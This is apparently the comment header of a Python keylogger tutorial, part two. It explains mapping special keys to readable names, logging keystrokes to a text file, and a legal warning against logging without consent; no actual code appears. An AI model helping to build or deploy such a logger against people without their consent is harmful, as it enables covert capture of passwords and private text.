# keylogger tutorial 2
# We are going to make our key logger a little bit better by removing the single quotes (' ') from the keys and also handling the special keys like shift,space, ctrl, alt, etc.
'''
Using multiple if statements like in the previous tutorial for special keys can be inefficient and harder to manage. 
A better way is to use a dictionary to map special keys to human-readable values. 
This makes the code cleaner, faster, and easier to update.
'''

'''‚ùå Warning: Keylogging without consent is illegal! and can lead to serious consequences.(fines, imprisonment, etc.)
You should never use this code to log someone's keystrokes without their permission.
Use it only for ethical hacking, forensics, or educational purposes.'''

# when you run the code you will see the keys you press in the terminal and also in the keylog_1.txt file.
# Also notice that the although the special keys are more readable, they are still create a lot of noise in the log file.
# We will work on removing the noise in the next tutorial.
